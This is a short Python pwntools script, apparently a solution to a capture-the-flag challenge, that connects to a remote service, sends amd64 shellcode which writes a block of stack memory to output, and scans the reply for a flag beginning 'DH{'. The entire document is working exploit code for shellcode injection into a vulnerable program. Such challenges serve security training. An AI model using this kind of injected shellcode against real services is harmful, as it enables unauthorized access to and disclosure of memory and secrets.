from pwn import *

#p = process('./main')
p = remote(ADDRESS, PORT)
context.arch = 'amd64'
shellcode = asm('''
    mov rax, 1
    mov rdi, 1
    mov rsi, rsp
    sub rsi, 0x200
    mov rdx, 0x400
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall
''')
p.sendlineafter(b'> ', shellcode)
output = p.recvall(timeout=2)
output = output.decode('utf-8', errors='ignore')
index = output.index("DH{")
while True:
    print(output[index], end='')
    if output[index] == '}':
        break
    index += 1
print()